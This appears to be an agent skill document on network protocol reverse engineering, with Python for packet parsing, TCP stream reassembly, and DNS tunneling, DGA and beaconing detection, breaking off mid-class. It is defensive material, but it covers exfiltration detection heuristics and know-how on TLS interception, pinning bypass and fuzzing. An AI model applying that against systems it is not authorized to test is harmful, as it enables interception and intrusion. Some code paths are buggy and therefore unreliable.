---
name: "protocol-analysis"
category: "reverse-engineering"
version: "1.0.0"
tags: ["reverse-engineering", "protocol-analysis", "network", "pcap", "dissection"]
---

# Protocol Analysis — Reverse Engineering Module

## Overview

Protocol analysis is the systematic examination of network communication to understand how systems exchange data. This module provides tools and methodologies for dissecting network traffic, reverse-engineering custom protocols, decoding encrypted communications where keys are available, and extracting actionable intelligence from packet captures.

Modern network protocols range from well-documented standards (HTTP/1.1, DNS, TLS, SMTP) to proprietary implementations used by malware C2 channels, IoT devices, industrial control systems (ICS/SCADA), and mobile applications. Reverse engineering a custom protocol requires understanding packet structure, state machines, serialization formats, and cryptographic protections.

This module supports the full protocol analysis lifecycle: packet capture generation and parsing, protocol dissection and field extraction, pattern recognition for unknown protocols, traffic reconstruction into application-layer sessions, encrypted traffic analysis (when decryption keys or TLS interceptors are available), and protocol fuzzing surface identification. It integrates with tcpdump, tshark, Scapy, and dpkt for packet manipulation, and provides Python-native analysis pipelines for automated traffic characterization.

Whether you are analyzing malware network behavior, debugging an API integration, auditing a proprietary IoT protocol, or investigating network forensics, this module provides the structured methodology and tools to decode what's happening on the wire.

## Core Capabilities

### 1. Packet Capture and Generation
Generate and parse pcap/pcapng files using Scapy or dpkt. Create synthetic traffic for protocol testing, inject packets for fuzzing, and capture live traffic through platform-native capture interfaces.

### 2. Protocol Dissection
Systematically decode protocol frames: identify header fields, parse variable-length encodings, extract payloads, and reconstruct multi-packet messages. Support for common protocols (HTTP, DNS, TCP, UDP, ICMP, TLS handshake) and extensible framework for custom protocol definition.

### 3. Unknown Protocol Discovery
Identify protocol patterns in unstructured traffic: magic byte detection, field boundary analysis, entropy profiling, frequency analysis, and byte distribution histograms. These techniques reveal packet structure without documentation.

### 4. Session and Flow Reconstruction
Reassemble packet streams into coherent application-layer sessions: TCP stream reassembly, HTTP request/response pairing, DNS query-response correlation, and custom protocol session tracking.

### 5. Encrypted Traffic Analysis
Analyze TLS/SSL traffic through certificate inspection, JA3/JA3S fingerprinting, SNI extraction, and certificate transparency log correlation. When decryption keys are available (via TLS interceptors or key logs), decode application payloads.

### 6. Protocol State Machine Extraction
Infer protocol state machines from observed traffic: identify request-response patterns, sequence number progressions, handshake sequences, and error handling behaviors. Automate state diagram generation from traffic samples.

### 7. C2 Protocol Fingerprinting
Identify command-and-control communication patterns: beaconing detection (periodic connections, jitter analysis), data exfiltration signatures (DNS tunneling, HTTP steganography, ICMP covert channels), and protocol impersonation (traffic disguised as legitimate protocols).

### 8. Protocol Fuzzing Surface Mapping
Identify protocol fields suitable for fuzzing: length fields, type codes, checksums, string boundaries, and state-dependent fields. Generate structured fuzzing inputs based on observed protocol structure.

## Usage Examples

### Basic Packet Capture Analysis

```python
from protocol_analysis_engine import PacketCapture, ProtocolType

capture = PacketCapture("traffic.pcap")
summary = capture.get_summary()

print(f"Packets: {summary.total_packets}")
print(f"Duration: {summary.duration:.2f}s")
print(f"Protocols: {', '.join(summary.protocols)}")
print(f"Source IPs: {summary.unique_src_ips}")
print(f"Dest IPs: {summary.unique_dst_ips}")
```

### HTTP Traffic Extraction

```python
from protocol_analysis_engine import ProtocolDissector, HTTPRequest, HTTPResponse

dissector = ProtocolDissector()
sessions = dissector.extract_http_sessions("traffic.pcap")

for session in sessions:
    print(f"\n{'='*60}")
    print(f"Request: {session.request.method} {session.request.uri}")
    print(f"  Host: {session.request.headers.get('Host', 'N/A')}")
    print(f"  User-Agent: {session.request.headers.get('User-Agent', 'N/A')}")
    print(f"  Content-Length: {session.request.headers.get('Content-Length', 0)}")
    print(f"Response: {session.response.status_code}")
    print(f"  Content-Type: {session.response.headers.get('Content-Type', 'N/A')}")
    print(f"  Body size: {len(session.response.body)} bytes")
```

### DNS Query Analysis

```python
from protocol_analysis_engine import DNSAnalyzer

analyzer = DNSAnalyzer()
dns_queries = analyzer.parse_dns("traffic.pcap")

print(f"Total DNS queries: {len(dns_queries)}")

# Find unique domains
domains = set(q.query_name for q in dns_queries)
print(f"Unique domains: {len(domains)}")

# Identify suspicious patterns
for query in dns_queries:
    if query.query_type == "TXT" and len(query.response_data) > 100:
        print(f"[!] Large TXT record: {query.query_name} ({len(query.response_data)} bytes)")
    if query.query_name.count('.') > 4:
        print(f"[!] Deep subdomain: {query.query_name}")
```

### TLS/SSL Traffic Fingerprinting

```python
from protocol_analysis_engine import TLSAnalyzer

analyzer = TLSAnalyzer()
fingerprints = analyzer.ja3_fingerprint("traffic.pcap")

for fp in fingerprints:
    print(f"JA3: {fp.ja3_hash}")
    print(f"  Client: {fp.client_hello}")
    print(f"  SNI: {fp.sni}")
    print(f"  Cert Issuer: {fp.certificate_issuer}")
    print(f"  Cert Subject: {fp.certificate_subject}")
    print(f"  Valid: {fp.not_before} to {fp.not_after}")
```

### Custom Protocol Reverse Engineering

```python
from protocol_analysis_engine import ProtocolReverseEngineer

engineer = ProtocolReverseEngineer()
protocol = engineer.analyze_unknown_protocol(
    pcap_path="custom_traffic.pcap",
    src_port=9999,
    dst_port=9999,
)

print(f"Detected structure:")
print(f"  Magic bytes: {protocol.magic_bytes.hex()}")
print(f"  Header length: {protocol.header_length} bytes")
print(f"  Endianness: {protocol.endianness}")
print(f"  Fields:")
for field in protocol.fields:
    print(f"    {field.name}: offset={field.offset}, size={field.size}, type={field.field_type}")
print(f"  Payload encoding: {protocol.payload_encoding}")
```

### Beaconing Detection

```python
from protocol_analysis_engine import BeaconDetector

detector = BeaconDetector()
beacons = detector.detect("traffic.pcap", min_connections=5)

for beacon in beacons:
    print(f"\nBeacon detected:")
    print(f"  Source: {beacon.src_ip}")
    print(f"  Destination: {beacon.dst_ip}:{beacon.dst_port}")
    print(f"  Interval: {beacon.mean_interval:.1f}s (jitter: {beacon.jitter:.1f}%)")
    print(f"  Connections: {beacon.connection_count}")
    print(f"  Regularity score: {beacon.regularity_score:.2f}")
    print(f"  Time range: {beacon.first_seen} to {beacon.last_seen}")
```

### Protocol State Machine Extraction

```python
from protocol_analysis_engine import StateMachineExtractor

extractor = StateMachineExtractor()
state_machine = extractor.extract("traffic.pcap", protocol_name="CustomProto")

print(f"States: {len(state_machine.states)}")
print(f"Transitions: {len(state_machine.transitions)}")

for state in state_machine.states:
    print(f"\n  State: {state.name}")
    print(f"    Entry conditions: {state.entry_conditions}")
    print(f"    Allowed messages: {[m.name for m in state.allowed_messages]}")

for trans in state_machine.transitions:
    print(f"  {trans.from_state} --[{trans.trigger}]--> {trans.to_state}")
```

### Traffic Statistics and Visualization

```python
from protocol_analysis_engine import TrafficStatistics

stats = TrafficStatistics("traffic.pcap")

print("Protocol Distribution:")
for proto, count in stats.protocol_distribution.items():
    print(f"  {proto}: {count} packets")

print("\nTop Source IPs:")
for ip, count in stats.top_source_ips(10):
    print(f"  {ip}: {count} packets")

print("\nBandwidth Over Time (1-minute intervals):")
for interval in stats.bandwidth_timeline(interval_seconds=60):
    print(f"  {interval.timestamp}: {interval.bytes_in} in / {interval.bytes_out} out")
```

### PCAP Filtering and Export

```python
from protocol_analysis_engine import PCAPFilter

filter_engine = PCAPFilter()

# Extract HTTP traffic only
http_pcap = filter_engine.filter_and_export(
    input_path="full_capture.pcap",
    output_path="http_only.pcap",
    bpf_filter="tcp port 80 or tcp port 443",
)

# Extract traffic to specific IP
target_pcap = filter_engine.filter_and_export(
    input_path="full_capture.pcap",
    output_path="target_traffic.pcap",
    bpf_filter="host 10.0.0.100",
)

print(f"Exported {http_pcap.packet_count} HTTP packets")
print(f"Exported {target_pcap.packet_count} target packets")
```

## Best Practices

### 1. Understand the Full Network Stack
Protocol analysis requires understanding layers: physical (link type), network (IP routing), transport (TCP/UDP reliability), and application (protocol semantics). Misinterpreting one layer leads to incorrect conclusions about higher layers. Always verify link type, IP headers, and transport checksums before analyzing application data.

### 2. Handle Fragmented and Out-of-Order Traffic
Real network traffic is rarely clean. TCP retransmissions, IP fragmentation, out-of-order delivery, and packet loss all affect analysis. Use tools that handle reassembly (tshark's `-z conv,tcp`, Scapy's `TCP_session`) rather than analyzing individual packets in isolation.

### 3. Be Aware of Encryption Boundaries
Most modern traffic is encrypted (TLS 1.2+, TLS 1.3). Protocol analysis above the TLS layer requires either: TLS interception (mitmproxy, Burp Suite) with certificate pinning bypass, application-level key extraction from memory, or protocol-aware encrypted traffic analysis (JA3, traffic volume patterns, timing analysis).

### 4. Respect Privacy and Legal Constraints
Network traffic analysis may expose sensitive data: credentials, personal information, proprietary data. Ensure you have proper authorization before capturing or analyzing network traffic. In incident response, follow organizational policies and legal requirements for evidence handling.

### 5. Validate Checksums and Integrity
Always verify protocol integrity fields (TCP checksum, UDP checksum, CRC) before trusting packet data. Corrupted packets can mislead analysis. Tools like Wireshark highlight checksum errors — investigate these rather than ignoring them.

### 6. Account for Protocol Evolution
Protocols change over versions. HTTP/1.0 vs HTTP/1.1 vs HTTP/2 vs HTTP/3 have different framing, header handling, and multiplexing behavior. TLS 1.2 vs TLS 1.3 differ in handshake structure and cipher suite negotiation. Document the protocol version you're analyzing and note version-specific behaviors.

### 7. Use Multiple Analysis Tools
No single tool provides complete visibility. Wireshark excels at interactive protocol dissection. tshark enables scripted analysis. Scapy provides packet crafting and custom dissection. tcpdump enables quick capture filtering. Zeek (formerly Bro) provides high-level protocol analysis and logging. Use each tool where it excels.

### 8. Document Protocol Specifications
As you reverse-engineer a protocol, document your findings in a protocol specification: field names, offsets, sizes, encodings, state machine, error handling, and examples. This documentation becomes invaluable for future analysis, tool development, and team knowledge sharing.

## Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                   Protocol Analysis Pipeline                     │
├─────────────────────────────────────────────────────────────────┤
│                                                                  │
│  ┌──────────┐    ┌──────────────┐    ┌─────────────────────┐   │
│  │  PCAP    │───▶│  Packet      │───▶│  Protocol           │   │
│  │  Input   │    │  Parser      │    │  Classifier         │   │
│  └──────────┘    └──────────────┘    └──────────┬──────────┘   │
│                                                  │               │
│              ┌───────────────────────────────────┼──────────┐   │
│              ▼                   ▼               ▼          ▼   │
│  ┌───────────────┐  ┌─────────────┐  ┌────────┐ ┌──────────┐  │
│  │  HTTP         │  │  DNS        │  │ TLS    │ │ Custom   │  │
│  │  Dissector    │  │  Analyzer   │  │ Fingerprint│ Protocol│  │
│  └───────┬───────┘  └──────┬──────┘  └───┬────┘ └────┬─────┘  │
│          │                 │              │           │         │
│          ▼                 ▼              ▼           ▼         │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │              Session & Flow Reconstruction                │  │
│  └──────────────────────────┬───────────────────────────────┘  │
│                              │                                  │
│              ┌───────────────┼───────────────────┐             │
│              ▼               ▼                   ▼             │
│  ┌────────────────┐ ┌────────────────┐ ┌─────────────────┐    │
│  │  Beacon        │ │  State Machine │ │  Traffic         │    │
│  │  Detection     │ │  Extraction    │ │  Statistics      │    │
│  └───────┬────────┘ └───────┬────────┘ └────────┬────────┘    │
│          │                  │                    │              │
│          ▼                  ▼                    ▼              │
│  ┌──────────────────────────────────────────────────────────┐  │
│  │            Intelligence Extraction & Reporting            │  │
│  └──────────────────────────┬───────────────────────────────┘  │
│                              │                                  │
│                              ▼                                  │
│                    ┌─────────────────────┐                     │
│                    │   Report Generator   │                     │
│                    │   (PCAP/JSON/MISP)   │                     │
│                    └─────────────────────┘                     │
│                                                                  │
├─────────────────────────────────────────────────────────────────┤
│  Tools: Scapy │ dpkt │ tshark │ tcpdump │ Zeek │ mitmproxy     │
│  Formats: pcap │ pcapng │ HAR │ JSON │ STIX                    │
└─────────────────────────────────────────────────────────────────┘
```

The pipeline processes packet captures through a layered analysis architecture. Packet parsing feeds into protocol classification, which routes traffic to specialized dissectors. Session reconstruction aggregates individual packets into coherent application-layer flows, enabling higher-level analysis like beacon detection and state machine extraction.

## Performance Considerations

### 1. Streaming Packet Processing
Large pcap files (10GB+) should be processed using streaming parsers (Scapy PcapReader, dpkt) rather than loading entire captures into memory. Process packets sequentially with constant memory usage.

### 2. BPF Filter Optimization
Apply Berkeley Packet Filters at capture time to reduce processing overhead. Filter by protocol, IP range, or port before analysis. BPF filters execute in kernel space and are 10-100x faster than user-space filtering.

### 3. Parallel Flow Processing
After initial packet parsing, process individual TCP/UDP flows in parallel using multiprocessing. Each flow is independent and can be analyzed concurrently for protocol dissection and session reconstruction.

### 4. Caching Protocol Definitions
Custom protocol dissector definitions should be compiled and cached. Protocol definition parsing and validation are expensive; cache compiled dissectors to disk for reuse across analysis runs.

### 5. Incremental Analysis
For large captures, analyze traffic incrementally: first pass identifies protocols and flows, second pass performs deep analysis on interesting flows. This reduces the volume of data requiring expensive processing.

### 6. PCAP Compression
Store intermediate analysis results in compressed formats (gzip, zstd). Network captures compress well (3-10x) due to protocol header repetition and ASCII-heavy payloads.

### 7. Memory-Mapped PCAP Access
For random-access analysis patterns, use memory-mapped file I/O to access pcap data without loading entire files. This enables efficient seeking and partial reads for targeted analysis.

## Security Considerations

### 1. Legal Authorization Required
Network traffic analysis may intercept communications involving third parties. Ensure you have proper legal authorization (network owner consent, law enforcement warrants, authorized penetration testing agreements) before capturing or analyzing traffic.

### 2. Sensitive Data Protection
Network captures may contain credentials, personal information, proprietary data, and intellectual property. Store captures securely, restrict access to authorized personnel, and implement secure deletion policies.

### 3. TLS Privacy Boundaries
Decrypting TLS traffic intercepts encrypted communications. Only perform TLS interception with explicit authorization from network owners. Use certificate transparency and JA3 fingerprinting as non-invasive alternatives when possible.

### 4. Capture Infrastructure Security
Packet capture systems themselves are high-value targets. Secure capture infrastructure with strong authentication, encrypted storage, and network segmentation. Compromised capture systems can be used for surveillance.

### 5. Data Retention Policies
Implement strict data retention policies for network captures. Delete captures after analysis completion unless required for legal or compliance purposes. Anonymize captures before sharing for analysis.

### 6. Tool Configuration Safety
Ensure network analysis tools don't inadvertently forward captured traffic. Disable routing capabilities on analysis workstations, configure firewalls to block outbound traffic, and verify network isolation.

## Related Modules

| Module | Relationship |
|--------|-------------|
| `binary-analysis` | Protocol implementations live in binaries; binary analysis reveals protocol structure |
| `malware-analysis` | Malware uses protocols for C2; protocol analysis decodes that communication |
| `decompilation` | Decompiling protocol handlers reveals exact packet construction logic |
| `firmware-analysis` | IoT/ICS devices implement protocols in firmware that may need reverse engineering |
| `web2-recon` | Web protocol analysis (HTTP/HTTPS) is a subset of this module's capabilities |

## References

- **TCP/IP Illustrated, Volume 1**: W. Richard Stevens, Addison-Wesley
- **Network Security Assessment**: Chris McNab, O'Reilly
- **Wireshark Network Analysis**: Laura Chappell, Wireshark University
- **Scapy Documentation**: https://scapy.readthedocs.io/
- **Zeek (Bro) Network Security Monitor**: https://zeek.org/
- **mitmproxy Documentation**: https://docs.mitmproxy.org/
- **JA3/JA3S Fingerprinting**: https://github.com/salesforce/ja3
- **RFC 793 - TCP**: https://tools.ietf.org/html/rfc793
- **RFC 791 - IP**: https://tools.ietf.org/html/rfc791
- **RFC 8446 - TLS 1.3**: https://tools.ietf.org/html/rfc8446

## Protocol Dissection Deep Dive

### Custom Protocol Definition and Parsing

Defining and parsing custom binary protocols from observed traffic patterns.

```python
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Callable
import struct
import json

@dataclass
class ProtocolField:
    """Definition of a single protocol field."""
    name: str
    offset: int
    size: int
    field_type: str  # 'uint8', 'uint16', 'uint32', 'uint64', 'bytes', 'string', 'length_prefixed'
    endianness: str = 'little'  # 'little' or 'big'
    description: str = ''
    is_length_field: bool = False
    references_field: str = ''
    transform: Optional[str] = None  # 'xor', 'base64', 'hex'

@dataclass
class ProtocolDefinition:
    """Complete protocol definition for parsing."""
    name: str
    magic_bytes: Optional[bytes] = None
    header_length: int = 0
    fields: List[ProtocolField] = field(default_factory=list)
    payload_offset: int = 0
    payload_length_field: str = ''
    delimiter: Optional[bytes] = None
    max_packet_size: int = 65536
    notes: str = ''

class ProtocolParser:
    """Parse binary protocol packets based on definition."""

    def __init__(self, definition: ProtocolDefinition):
        self.definition = definition
        self._compiled_fields = self._compile_fields()

    def _compile_fields(self):
        """Pre-compile field definitions for efficient parsing."""
        compiled = []
        for field_def in self.definition.fields:
            fmt = self._get_struct_format(field_def)
            compiled.append({
                'def': field_def,
                'struct_fmt': fmt,
                'struct_size': struct.calcsize(fmt) if fmt else 0,
            })
        return compiled

    def _get_struct_format(self, field_def: ProtocolField):
        """Get struct format string for a field."""
        endian = '<' if field_def.endianness == 'little' else '>'
        type_map = {
            'uint8': f'{endian}B',
            'uint16': f'{endian}H',
            'uint32': f'{endian}I',
            'uint64': f'{endian}Q',
            'int8': f'{endian}b',
            'int16': f'{endian}h',
            'int32': f'{endian}i',
            'int64': f'{endian}q',
            'float32': f'{endian}f',
            'float64': f'{endian}d',
        }
        return type_map.get(field_def.field_type, None)

    def parse_packet(self, data: bytes) -> dict:
        """Parse a raw packet into structured fields."""
        if len(data) < self.definition.header_length:
            raise ValueError(f"Packet too short: {len(data)} bytes < {self.definition.header_length}")

        # Verify magic bytes
        if self.definition.magic_bytes:
            if data[:len(self.definition.magic_bytes)] != self.definition.magic_bytes:
                raise ValueError("Magic bytes mismatch")

        result = {'_raw': data.hex(), '_length': len(data)}
        current_offset = 0

        for compiled_field in self._compiled_fields:
            field_def = compiled_field['def']

            # Handle variable-length fields
            if field_def.field_type == 'length_prefixed':
                prefix_size = field_def.size
                if field_def.endianness == 'little':
                    length = int.from_bytes(data[current_offset:current_offset+prefix_size], 'little')
                else:
                    length = int.from_bytes(data[current_offset:current_offset+prefix_size], 'big')
                current_offset += prefix_size
                value = data[current_offset:current_offset+length]
                result[field_def.name] = value
                current_offset += length
            elif field_def.field_type == 'bytes':
                value = data[current_offset:current_offset+field_def.size]
                result[field_def.name] = value
                current_offset += field_def.size
            elif field_def.field_type == 'string':
                end = data.find(b'\x00', current_offset)
                if end == -1:
                    end = current_offset + field_def.size
                value = data[current_offset:end].decode('ascii', errors='replace')
                result[field_def.name] = value
                current_offset = end + 1
            else:
                fmt = compiled_field['struct_fmt']
                value = struct.unpack_from(fmt, data, current_offset)[0]
                result[field_def.name] = value
                current_offset += compiled_field['struct_size']

                # Handle length field reference
                if field_def.is_length_field:
                    result[f'_{field_def.name}_points_to'] = current_offset + value

        # Extract payload
        if self.definition.payload_offset > 0:
            payload_offset = self.definition.payload_offset
            if self.definition.payload_length_field:
                length_field = self.definition.fields[
                    next(i for i, f in enumerate(self.definition.fields)
                        if f.name == self.definition.payload_length_field)
                ]
                payload_length = result[self.definition.payload_length_field]
                result['_payload'] = data[payload_offset:payload_offset+payload_length]
            else:
                result['_payload'] = data[payload_offset:]

        return result

    def parse_stream(self, data: bytes) -> List[dict]:
        """Parse a stream of consecutive packets."""
        packets = []
        offset = 0

        while offset < len(data):
            if self.definition.delimiter:
                # Delimiter-based framing
                end = data.find(self.definition.delimiter, offset)
                if end == -1:
                    break
                packet_data = data[offset:end]
                offset = end + len(self.definition.delimiter)
            else:
                # Length-based framing
                if offset + 4 > len(data):
                    break
                if self.definition.payload_length_field:
                    # Use length field from header
                    pass
                else:
                    # Fixed header + payload length
                    packet_length = struct.unpack_from('<I', data, offset)[0]
                    if packet_length > self.definition.max_packet_size:
                        break
                    packet_data = data[offset:offset+packet_length]
                    offset += packet_length

            try:
                packet = self.parse_packet(packet_data)
                packets.append(packet)
            except ValueError:
                offset += 1

        return packets
```

### TCP Stream Reassembly

Reassembling TCP streams from packet captures for application-layer analysis.

```python
from collections import defaultdict
from dataclasses import dataclass, field
from typing import List, Dict, Tuple, Optional
import struct

@dataclass
class TCPSegment:
    """A single TCP segment."""
    src_ip: str
    dst_ip: str
    src_port: int
    dst_port: int
    seq_num: int
    ack_num: int
    flags: int
    payload: bytes
    timestamp: float
    window_size: int

    @property
    def is_syn(self):
        return bool(self.flags & 0x02)

    @property
    def is_ack(self):
        return bool(self.flags & 0x10)

    @property
    def is_fin(self):
        return bool(self.flags & 0x01)

    @property
    def is_rst(self):
        return bool(self.flags & 0x04)

    @property
    def payload_size(self):
        return len(self.payload)

@dataclass
class TCPStream:
    """A reassembled TCP stream."""
    stream_id: str
    client_ip: str
    server_ip: str
    client_port: int
    server_port: int
    segments: List[TCPSegment] = field(default_factory=list)
    client_data: bytes = b''
    server_data: bytes = b''
    start_time: float = 0
    end_time: float = 0

class TCPStreamReassembler:
    """Reassemble TCP streams from individual segments."""

    def __init__(self):
        self.streams: Dict[str, TCPStream] = {}
        self.segment_buffer: Dict[str, List[TCPSegment]] = defaultdict(list)

    def add_segment(self, segment: TCPSegment):
        """Add a TCP segment to the appropriate stream."""
        stream_key = self._get_stream_key(segment)

        if segment.is_syn and not segment.is_ack:
            # New connection
            self.streams[stream_key] = TCPStream(
                stream_id=stream_key,
                client_ip=segment.src_ip,
                server_ip=segment.dst_ip,
                client_port=segment.src_port,
                server_port=segment.dst_port,
                start_time=segment.timestamp,
            )

        if stream_key in self.streams:
            stream = self.streams[stream_key]
            stream.segments.append(segment)
            stream.end_time = segment.timestamp

            # Classify direction
            if segment.src_ip == stream.client_ip:
                stream.client_data += segment.payload
            else:
                stream.server_data += segment.payload

    def _get_stream_key(self, segment: TCPSegment) -> str:
        """Generate a unique stream identifier."""
        ips = sorted([segment.src_ip, segment.dst_ip])
        ports = sorted([segment.src_port, segment.dst_port])
        return f"{ips[0]}:{ports[0]}-{ips[1]}:{ports[1]}"

    def get_streams(self) -> List[TCPStream]:
        """Return all reassembled streams."""
        return list(self.streams.values())

    def get_stream_by_port(self, port: int) -> List[TCPStream]:
        """Find streams involving a specific port."""
        return [s for s in self.streams.values()
                if s.client_port == port or s.server_port == port]

    def get_largest_streams(self, n: int = 10) -> List[TCPStream]:
        """Return the N largest streams by data volume."""
        return sorted(
            self.streams.values(),
            key=lambda s: len(s.client_data) + len(s.server_data),
            reverse=True
        )[:n]

    def extract_http_from_stream(self, stream: TCPStream) -> List[dict]:
        """Extract HTTP request/response pairs from a TCP stream."""
        http_pairs = []

        # Simple HTTP parser on server data
        data = stream.server_data
        request_data = stream.client_data

        # Find HTTP responses
        http_pattern = b'HTTP/1.'
        offset = 0
        while True:
            pos = data.find(http_pattern, offset)
            if pos == -1:
                break

            # Find end of headers
            header_end = data.find(b'\r\n\r\n', pos)
            if header_end == -1:
                break
            header_end += 4

            # Parse status line
            status_line = data[pos:pos+data.index(b'\r\n', pos)-pos]
            parts = status_line.split(b' ', 2)
            status_code = int(parts[1]) if len(parts) > 1 else 0

            # Find Content-Length
            headers_raw = data[pos:header_end].decode('ascii', errors='replace')
            content_length = 0
            for line in headers_raw.split('\r\n'):
                if line.lower().startswith('content-length:'):
                    content_length = int(line.split(':', 1)[1].strip())

            body = data[header_end:header_end+content_length]

            http_pairs.append({
                'status_code': status_code,
                'headers': headers_raw,
                'body_length': len(body),
                'body_preview': body[:200],
            })

            offset = header_end + content_length

        return http_pairs

    def identify_protocols(self, stream: TCPStream) -> List[str]:
        """Identify application protocols in a TCP stream."""
        protocols = []
        data = stream.server_data + stream.client_data

        # HTTP detection
        if data[:4] in (b'HTTP', b'GET ', b'POST', b'PUT ', b'DELE'):
            protocols.append('HTTP')

        # TLS detection
        if data[:1] == b'\x16' and len(data) > 5:
            protocols.append('TLS')

        # SSH detection
        if data[:4] == b'SSH-':
            protocols.append('SSH')

        # DNS detection (port 53)
        if stream.client_port == 53 or stream.server_port == 53:
            protocols.append('DNS')

        # SMTP detection
        if data[:4] == b'220 ':
            protocols.append('SMTP')

        # FTP detection
        if data[:4] == b'220 ' or data[:3] == b'220':
            protocols.append('FTP')

        return protocols
```

### DNS Tunnel Detection and Analysis

Detecting DNS-based data exfiltration and covert channels.

```python
import re
from collections import Counter
from dataclasses import dataclass
from typing import List, Dict

@dataclass
class DNSQuery:
    """Represents a single DNS query."""
    timestamp: float
    src_ip: str
    dst_ip: str
    query_name: str
    query_type: str
    response_code: str
    response_data: List[str]
    query_length: int
    subdomain_count: int
    entropy: float

class DNSAnalyzer:
    """Analyze DNS traffic for tunneling and covert channels."""

    SUSPICIOUS_TLDS = ['.tk', '.ml', '.ga', '.cf', '.gq', '.xyz',
                       '.top', '.club', '.work', '.buzz', '.icu']

    def __init__(self):
        self.queries: List[DNSQuery] = []

    def analyze_tunneling(self, queries: List[DNSQuery]) -> List[dict]:
        """Detect DNS tunneling patterns."""
        findings = []

        # Group by domain
        domain_groups = {}
        for q in queries:
            domain = self._extract_base_domain(q.query_name)
            if domain not in domain_groups:
                domain_groups[domain] = []
            domain_groups[domain].append(q)

        for domain, domain_queries in domain_groups.items():
            # Check for long subdomains (potential encoded data)
            long_subdomains = [q for q in domain_queries
                              if q.subdomain_count > 3]

            if long_subdomains:
                findings.append({
                    'type': 'dns_tunnel_long_subdomain',
                    'severity': 'high',
                    'domain': domain,
                    'affected_queries': len(long_subdomains),
                    'max_subdomain_depth': max(q.subdomain_count for q in long_subdomains),
                    'sample': long_subdomains[0].query_name,
                })

            # Check for high query volume to single domain
            if len(domain_queries) > 100:
                findings.append({
                    'type': 'dns_tunnel_high_volume',
                    'severity': 'medium',
                    'domain': domain,
                    'query_count': len(domain_queries),
                    'time_span': domain_queries[-1].timestamp - domain_queries[0].timestamp,
                })

            # Check for high entropy in subdomains
            high_entropy = [q for q in domain_queries if q.entropy > 3.5]
            if len(high_entropy) > len(domain_queries) * 0.5:
                findings.append({
                    'type': 'dns_tunnel_high_entropy',
                    'severity': 'high',
                    'domain': domain,
                    'high_entropy_ratio': len(high_entropy) / len(domain_queries),
                    'avg_entropy': sum(q.entropy for q in high_entropy) / len(high_entropy),
                })

            # Check for TXT record abuse
            txt_queries = [q for q in domain_queries if q.query_type == 'TXT']
            if txt_queries:
                avg_response_size = sum(
                    sum(len(r) for r in q.response_data)
                    for q in txt_queries
                ) / len(txt_queries)
                if avg_response_size > 100:
                    findings.append({
                        'type': 'dns_tunnel_txt_abuse',
                        'severity': 'high',
                        'domain': domain,
                        'txt_query_count': len(txt_queries),
                        'avg_response_size': avg_response_size,
                    })

            # Check for NXDOMAIN responses (potential data channel)
            nxdomain = [q for q in domain_queries
                       if q.response_code == 'NXDOMAIN']
            if len(nxdomain) > len(domain_queries) * 0.7:
                findings.append({
                    'type': 'dns_tunnel_nxdomain',
                    'severity': 'medium',
                    'domain': domain,
                    'nxdomain_ratio': len(nxdomain) / len(domain_queries),
                })

        return findings

    def _extract_base_domain(self, fqdn: str) -> str:
        """Extract base domain from a fully qualified domain name."""
        parts = fqdn.rstrip('.').split('.')
        if len(parts) >= 2:
            return '.'.join(parts[-2:])
        return fqdn

    def detect_dga(self, queries: List[DNSQuery]) -> List[dict]:
        """Detect Domain Generation Algorithm (DGA) patterns."""
        findings = []
        domain_counts = Counter()

        for q in queries:
            domain = self._extract_base_domain(q.query_name)
            domain_counts[domain] += 1

        for domain, count in domain_counts.most_common(100):
            subdomains = [q.query_name.split('.')[0]
                         for q in queries
                         if self._extract_base_domain(q.query_name) == domain]

            # Analyze subdomain characteristics
            lengths = [len(s) for s in subdomains]
            if not lengths:
                continue

            avg_length = sum(lengths) / len(lengths)
            unique_ratio = len(set(subdomains)) / len(subdomains) if subdomains else 0

            # High uniqueness and random-looking subdomains = DGA
            if (unique_ratio > 0.95 and avg_length > 10 and count > 20):
                # Check character distribution
                all_chars = ''.join(subdomains)
                char_freq = Counter(all_chars)
                # High entropy = random
                import math
                entropy = 0
                for freq in char_freq.values():
                    p = freq / len(all_chars)
                    entropy -= p * math.log2(p)

                if entropy > 3.5:
                    findings.append({
                        'type': 'dga_detected',
                        'severity': 'critical',
                        'domain': domain,
                        'query_count': count,
                        'unique_subdomains': len(set(subdomains)),
                        'avg_subdomain_length': avg_length,
                        'char_entropy': entropy,
                        'sample_subdomains': subdomains[:10],
                    })

        return findings

    def calculate_subdomain_entropy(self, subdomain: str) -> float:
        """Calculate Shannon entropy of a subdomain string."""
        import math
        length = len(subdomain)
        if length == 0:
            return 0.0

        freq = Counter(subdomain.lower())
        entropy = 0.0
        for count in freq.values():
            p = count / length
            if p > 0:
                entropy -= p * math.log2(p)

        return entropy

    def extract_encoded_data(self, queries: List[DNSQuery]) -> str:
        """Attempt to extract data encoded in DNS queries."""
        encoded_parts = []
        for q in sorted(queries, key=lambda x: x.timestamp):
            subdomain = q.query_name.split('.')[0]
            # Remove common prefixes/suffixes
            if len(subdomain) > 4:
                encoded_parts.append(subdomain)

        # Try base64 decoding
        import base64
        combined = ''.join(encoded_parts)
        try:
            # Try base64 URL-safe
            padded = combined + '=' * (4 - len(combined) % 4)
            decoded = base64.urlsafe_b64decode(padded)
            return decoded.decode('utf-8', errors='replace')
        except Exception:
            pass

        # Try hex decoding
        try:
            decoded = bytes.fromhex(combined)
            return decoded.decode('utf-8', errors='replace')
        except Exception:
            pass

        return combined
```

### HTTP/2 Protocol Analysis

Analyzing HTTP/2 traffic for security assessment and protocol understanding.

```python
import struct
from dataclasses import dataclass, field
from typing import List, Dict, Optional

@dataclass
class HTTP2Frame:
    """Represents an HTTP/2 frame."""
    length: int
    frame_type: int
    flags: int
    stream_id: int
    payload: bytes

    FRAME_TYPES = {
        0: 'DATA',
        1: 'HEADERS',
        2: 'PRIORITY',
        3: 'RST_STREAM',
        4: 'SETTINGS',
        5: 'PUSH_PROMISE',
        6: 'PING',
        7: 'GOAWAY',
        8: 'WINDOW_UPDATE',
        9: 'CONTINUATION',
    }

    @property
    def type_name(self):
        return self.FRAME_TYPES.get(self.frame_type, f'UNKNOWN({self.frame_type})')

@dataclass
class HTTP2Settings:
    """HTTP/2 SETTINGS frame parameters."""
    header_table_size: int = 4096
    enable_push: int = 1
    max_concurrent_streams: int = None
    initial_window_size: int = 65535
    max_frame_size: int = 16384
    max_header_list_size: int = None

class HTTP2Analyzer:
    """Analyze HTTP/2 protocol traffic."""

    PREFACE = b'PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n'

